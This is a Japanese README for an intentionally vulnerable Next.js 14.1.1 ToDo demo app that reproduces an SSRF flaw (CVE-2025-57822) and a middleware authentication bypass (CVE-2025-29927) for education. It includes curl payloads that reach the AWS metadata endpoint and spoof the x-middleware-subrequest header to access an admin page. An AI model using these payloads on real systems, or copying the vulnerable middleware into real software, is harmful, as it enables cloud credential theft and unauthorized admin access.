# Next.js 14.1.1 脆弱性デモ (CVE-2025-57822 & CVE-2025-29927)

ToDoリスト管理アプリケーションを使用して、Next.js 14.1.1の2つの重大な脆弱性を再現するためのデモプロジェクト。

## 概要

このプロジェクトは、BetterAuthを使用した認証機能を持つToDoアプリケーションで、Next.js 14.1.1の以下の脆弱性を実装しています:

- **CVE-2025-57822**: SSRF (Server-Side Request Forgery) 脆弱性 - CVSS 6.5 (Medium)
- **CVE-2025-29927**: ミドルウェアバイパス脆弱性 - CVSS 9.1 (Critical)

**⚠️ 警告**: このプロジェクトは教育目的で意図的に脆弱性を含んでいます。本番環境では使用しないでください。

## 機能

- TOPページから直接ログイン/登録
- ToDoの作成、編集、削除
- BetterAuthによる認証
- Prisma + SQLite
- **脆弱なMiddleware**: 2つのCVEを再現

## 脆弱性の詳細

### CVE-2025-57822: SSRF脆弱性

ミドルウェアで生のヘッダーを`NextResponse.next()`に渡すことで、攻撃者が`Location`ヘッダーを操作してサーバー側から任意のURLへリクエストを送信可能。

**検証ガイド**: [docs/CVE-2025-57822-verification.md](docs/CVE-2025-57822-verification.md)

### CVE-2025-29927: ミドルウェアバイパス

`x-middleware-subrequest`ヘッダーを偽装することで、認証・認可チェックを完全にバイパス可能。

**検証ガイド**: [docs/CVE-2025-29927-verification.md](docs/CVE-2025-29927-verification.md)

## 開発環境のセットアップ

### 必要なもの
- Docker & Docker Compose
- ポート3000が利用可能であること

### Docker（本番ビルド）

```bash
# ビルドと起動
docker compose up --build

# 停止
docker compose down
```

詳細なセットアップ手順は [docs/SETUP.md](docs/SETUP.md) を参照してください。

## 脆弱性の検証

### CVE-2025-57822 (SSRF) の検証

詳細は [docs/CVE-2025-57822-verification.md](docs/CVE-2025-57822-verification.md) を参照。

```bash
# 基本的なSSRF攻撃
curl -H "Location: http://169.254.169.254/latest/meta-data/" \
     -H "Cookie: better-auth.session_token=<your-token>" \
     http://localhost:3000/
```

### CVE-2025-29927 (ミドルウェアバイパス) の検証

詳細は [docs/CVE-2025-29927-verification.md](docs/CVE-2025-29927-verification.md) を参照。

```bash
# 管理者ページへの不正アクセス
curl -H "x-middleware-subrequest: 1" \
     -H "Cookie: better-auth.session_token=<non-admin-token>" \
     http://localhost:3000/admin
```

## プロジェクト構成

- `/app` - Next.js App Router
  - `/admin` - 管理者専用ページ (CVE-2025-29927のデモ)
- `/lib` - BetterAuth設定
- `/prisma` - データベーススキーマ
- `/docs` - 検証ガイドとドキュメント
- `middleware.ts` - **脆弱なMiddleware実装** (両方のCVEを含む)

## 検証手順の詳細

各CVEの詳細な検証手順は、以下のドキュメントを参照してください:

1. **[セットアップガイド](docs/SETUP.md)**
   - 環境構築手順
   - データベースマイグレーション
   - 管理者アカウント作成

2. **[CVE-2025-57822 検証ガイド](docs/CVE-2025-57822-verification.md)**
   - SSRF攻撃の実行方法
   - AWSメタデータ窃取
   - 内部ネットワークスキャン

3. **[CVE-2025-29927 検証ガイド](docs/CVE-2025-29927-verification.md)**
   - ミドルウェアバイパス攻撃
   - 認証・認可の完全バイパス
   - 管理者権限の不正取得

## ライセンス

このプロジェクトは教育目的のみです。
